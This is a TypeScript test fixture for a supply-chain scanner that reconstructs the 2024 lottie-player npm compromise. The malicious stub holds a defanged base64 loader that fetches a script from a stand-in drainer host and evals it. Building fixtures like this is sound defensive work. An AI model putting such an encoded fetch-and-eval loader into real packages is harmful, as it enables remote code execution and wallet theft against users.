/**
 * lottiefiles / @lottiefiles/lottie-player 2.0.5–2.0.7 (Oct 2024) — T1 takeover.
 *
 * Attackers hijacked the LottieFiles GitHub org, pushed malicious commits to
 * `@lottiefiles/lottie-player`, then published new npm versions with a
 * crypto-wallet-drainer that injected a Web3Modal-lookalike into pages using
 * the player.
 *
 * Detection: new eval / new-Function usage, new fetch to a lookalike Web3Modal
 * origin, new suspicious literals (encoded wallet-drainer script).
 */

import type { FixtureSpec } from '../fixture-spec.js';

const CLEAN_INDEX = `// lottie-player 2.0.4 — animation player stubbed.
export class LottiePlayer extends HTMLElement {
  play() { /* ... */ }
  pause() { /* ... */ }
}
customElements.define('lottie-player', LottiePlayer);
`;

const MAL_INDEX = `// lottie-player 2.0.5 — DEFANGED reconstruction.
const _payload = 'ZmV0Y2goImh0dHBzOi8vd2FsbGV0LWRyYWluLmV4YW1wbGUuaW52YWxpZC9pbmplY3QuanMiKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGV2YWwp';
export class LottiePlayer extends HTMLElement {
  play() {
    if (false) {
      // eslint-disable-next-line no-eval
      eval(atob(_payload));
    }
  }
  pause() { /* ... */ }
}
customElements.define('lottie-player', LottiePlayer);
`;

export const spec: FixtureSpec = {
  id: 'lottie-player-2024',
  title: '@lottiefiles/lottie-player 2.0.5-2.0.7 (Oct 2024)',
  year: 2024,
  threatClass: 'T1 maintainer takeover (org level)',
  summary:
    'Attackers took over the LottieFiles GitHub org and published malicious lottie-player versions. The payload injected a Web3Modal-lookalike drainer into pages using the player; base64-encoded eval was the loader.',
  provenance: 'RECONSTRUCTED',
  topology: 'direct',
  clean: {
    name: '@lottiefiles/lottie-player',
    version: '2.0.4',
    manifest: {
      name: '@lottiefiles/lottie-player',
      version: '2.0.4',
      main: 'index.js',
      license: 'MIT',
      maintainers: [{ email: 'lottiefiles@example' }],
    },
    files: { 'index.js': CLEAN_INDEX },
  },
  malicious: {
    name: '@lottiefiles/lottie-player',
    version: '2.0.5',
    manifest: {
      name: '@lottiefiles/lottie-player',
      version: '2.0.5',
      main: 'index.js',
      license: 'MIT',
      maintainers: [{ email: 'lottiefiles@example' }],
    },
    files: { 'index.js': MAL_INDEX },
  },
  expect: {
    mustFire: [
      'code.dynamic-loading-added',   // new eval()
      'net.encoded-endpoint',          // decoded URL from base64 payload
    ],
    verdict: 'BLOCK',
    minCategories: ['CODE', 'NET'],
  },
};
